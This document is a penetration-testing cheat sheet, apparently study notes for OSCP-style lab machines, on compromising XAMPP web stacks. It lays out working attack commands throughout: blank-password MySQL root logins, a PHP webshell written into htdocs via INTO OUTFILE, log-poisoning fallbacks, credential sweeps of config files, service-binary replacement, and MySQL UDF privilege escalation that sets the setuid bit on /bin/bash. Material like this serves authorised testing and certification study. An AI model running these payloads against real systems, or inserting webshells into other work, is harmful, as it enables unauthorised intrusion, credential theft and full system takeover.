# XAMPP Target — Full Methodology (Foothold → Privesc)

XAMPP shows up as **both** an initial-access surface (web app on top of Apache/MySQL/PHP) and a **local privesc vector** (weak install permissions, service running as SYSTEM/root, exposed default creds). Work it in this order.

---

## 1. Identify & Fingerprint

```bash
# Confirm it's XAMPP, not a bare LAMP/WAMP stack
curl -s -I http://<target>/          # look for "Server: Apache" + XAMPP default page
curl -s http://<target>/dashboard/   # XAMPP dashboard (default install)
curl -s http://<target>/xampp/       # older XAMPP splash paths
nmap -p 80,443,3306,21,22 -sV <target>
```

**Decision point:** if `/dashboard/phpinfo.php` or `/xampp/phpinfo.php` loads → grab it, it leaks full install paths, PHP version, `disable_functions`, and `extension_dir` — all needed later for webshell/UDF work.

```bash
curl -s http://<target>/dashboard/phpinfo.php | grep -iE "disable_functions|extension_dir|DOCUMENT_ROOT|SERVER_SOFTWARE"
```

---

## 2. Default Creds & Exposed Panels

XAMPP ships insecure by default — always hit these before anything else.

|Panel|Default path|Default creds|
|---|---|---|
|phpMyAdmin|`/phpmyadmin/`|`root` : _(blank)_|
|XAMPP Security|`/security/`|`lampp` / `xampp` (varies by version)|
|Webalizer|`/webalizer/`|none — info leak only|
|FTP (FileZilla bundled)|port 21|check for anon login|

```bash
mysql -h <target> -u root                       # try blank password first
mysql -h <target> -u root -p'root'
mysql -h <target> -u root -p'xampp'
ftp <target>                                     # try anonymous / anonymous
```

**Decision point:** phpMyAdmin reachable + `root` blank/weak password → skip straight to §3 (MySQL → RCE), don't bother brute-forcing the web app.

---

## 3. MySQL → RCE (if creds obtained)

```sql
-- confirm write access to filesystem
SHOW VARIABLES LIKE 'secure_file_priv';
SELECT @@version_compile_os;
```

- `secure_file_priv` empty → you can write anywhere via `INTO OUTFILE`.
- `secure_file_priv` set to a path → you can only write inside it (often still `htdocs`).

```sql
-- write a PHP webshell straight into htdocs via phpMyAdmin SQL tab or mysql CLI
SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE 'C:/xampp/htdocs/shell.php';
-- Linux XAMPP install:
SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/opt/lampp/htdocs/shell.php';
```

```bash
curl "http://<target>/shell.php?c=whoami"
```

**Decision point:** `INTO OUTFILE` fails / permission denied → fall back to phpMyAdmin's own LFI-to-RCE trick (log poisoning) below.

```sql
-- log poisoning fallback if general_log can be toggled
SET GLOBAL general_log = 'ON';
SET GLOBAL general_log_file = 'C:/xampp/htdocs/shell.php';
SELECT '<?php system($_GET["c"]); ?>';
```

---

## 4. Web-App-Level Foothold (if no DB creds yet)

```bash
# htdocs is usually wide open for writes on misconfigured installs
gobuster dir -u http://<target> -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php
```

- Check for **upload forms**, exposed `.git`, backup files (`config.php.bak`, `.env`), and any custom app sitting on top of XAMPP — treat that app with normal web methodology (SQLi, file upload, LFI).
- `C:\xampp\htdocs\` (or `/opt/lampp/htdocs/`) is a common world-writable directory even without DB access — check via any LFI/directory-listing bug.

```bash
curl -s http://<target>/config.php.bak
curl -s http://<target>/.git/config
```

**Decision point:** LFI found anywhere in the custom app → try to include `C:\xampp\apache\logs\access.log` (poisoned via User-Agent PHP payload) for LFI-to-RCE, same pattern as MySQL log poisoning above.

---

## 5. Post-Foothold: Loot XAMPP Config Files

Once you have any shell (webshell/RCE), immediately pull these — they're gold for lateral movement and privesc:

```
C:\xampp\phpMyAdmin\config.inc.php      # DB creds, blowfish secret
C:\xampp\mysql\bin\my.ini               # MySQL config, sometimes creds
C:\xampp\apache\conf\httpd.conf         # vhosts, doc roots, other sites
C:\xampp\htdocs\*\config.php            # app-level DB creds
C:\xampp\passwords.txt                  # sometimes left over from setup
C:\xampp\FileZillaFTP\FileZilla Server.xml   # bundled FTP server creds (hashed)
```

```bash
# credential sweep across the whole install
findstr /si password C:\xampp\htdocs\*.php C:\xampp\phpMyAdmin\*.php 2>nul
grep -riE "password|passwd|pwd|secret" /opt/lampp/htdocs/ /opt/lampp/phpmyadmin/config.inc.php 2>/dev/null
```

```sh
C:\xampp\mysql\bin> .\mysql.exe -u<username> -p'<password>' <db_name> -e 'show tables';

C:\xampp\mysql\bin> .\mysql.exe -u<username> -p'<password>' <db_name> -e 'describe <table_name>';

C:\xampp\mysql\bin> .\mysql.exe -u<username> -p'<password>' <db_name> -e 'select <field_name> from <table_name>\G';
```

---

## 6. Local Privilege Escalation via XAMPP

This is the part that shows up repeatedly on OSCP-style boxes: **XAMPP is installed but the Apache/MySQL services run as SYSTEM (Windows) or root (Linux), while the install directory itself has weak permissions.**

### 6a. Check who the service runs as

```powershell
# Windows
sc.exe qc Apache2.4
sc.exe qc mysql
Get-WmiObject win32_service | Where-Object {$_.Name -like "*apache*" -or $_.Name -like "*mysql*"} | Select Name,StartName
```

```bash
# Linux
ps aux | grep -E "httpd|apache|mysqld"
```

### 6b. Check filesystem permissions on the XAMPP root

```powershell
icacls "C:\xampp"
icacls "C:\xampp\htdocs"
icacls "C:\xampp\apache\bin\httpd.exe"
icacls "C:\xampp\mysql\bin\mysqld.exe"
```

```bash
ls -la /opt/lampp/
find /opt/lampp -perm -o+w -type f 2>/dev/null   # world-writable files
find /opt/lampp -perm -o+w -type d 2>/dev/null   # world-writable dirs
```

**Decision point (this is the classic XAMPP privesc chain):**

|Finding|Exploit|
|---|---|
|`Everyone:(F)` / `BUILTIN\Users:(M)` on `C:\xampp\htdocs` and service runs as SYSTEM|Drop webshell in htdocs → already SYSTEM via Apache worker process, OR wait for a scheduled backup/cron that executes from htdocs|
|Write access to `C:\xampp\apache\bin\httpd.exe` or `mysqld.exe`, service auto-restarts|Replace binary with malicious payload, restart service (`net stop/start`) or wait for reboot|
|`mysqld` running as root/SYSTEM + you have DB creds|MySQL **UDF (User Defined Function) injection** — see §6c|
|Cron/Scheduled Task runs a script inside `htdocs` or `/opt/lampp/htdocs` as root/SYSTEM|Overwrite that script with your payload|
|World-writable `C:\xampp\php\php.ini`|Add `auto_prepend_file` pointing to your malicious PHP, forces execution on every request as the service account|
|Weak service permissions (`sc.exe qc` shows editable path)|`sc config <service> binpath= "C:\payload.exe"` then restart|

### 6c. MySQL UDF privesc (root/SYSTEM mysqld + DB creds)

```sql
-- Windows: drop a malicious DLL as a UDF, get code exec as mysqld's user (often SYSTEM)
SELECT sys_exec('whoami > C:\\xampp\\htdocs\\out.txt');   -- if UDF already loaded

-- if UDF not loaded, use Metasploit or manual raptor_udf2 for Linux:
-- msfconsole -> exploit/multi/mysql/mysql_udf_payload  (check OSCP exam rules on Metasploit module use)
```

```bash
# Linux manual UDF (raptor_udf2.c) if gcc available on target
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
# then in mysql:
# CREATE FUNCTION do_system RETURNS INTEGER SONAME 'raptor_udf2.so';
# SELECT do_system('chmod +s /bin/bash');
```

### 6d. Sanity checks always worth running regardless of XAMPP specifics

```powershell
whoami /priv                 # SeImpersonate / SeBackup / SeDebug etc.
winPEAS.exe                  # automated sweep — flags XAMPP perms automatically
```

```bash
sudo -l
find / -perm -4000 -type f 2>/dev/null
linpeas.sh
```

---

## Priority Fast-Path (try in this order)

1. **Blank/default `root` MySQL creds** → phpMyAdmin or CLI → `INTO OUTFILE` webshell into `htdocs`.
2. **`icacls`/`ls -la` on the XAMPP root** — weak perms on install dir is the single most common finding on these boxes.
3. **Grep config files** (`config.inc.php`, `my.ini`) for reused creds once you have any shell.
4. **Service run-as check** — if Apache/MySQL is SYSTEM/root and you can write to the binary or htdocs, you likely don't need a "real" privesc technique at all.
5. Only fall back to UDF injection / log poisoning if the above are locked down.

---

_Remember to document which enumeration output (icacls result, phpinfo leak, mysql version, etc.) justified each step — that's what OSCP report grading actually checks, not just the final shell._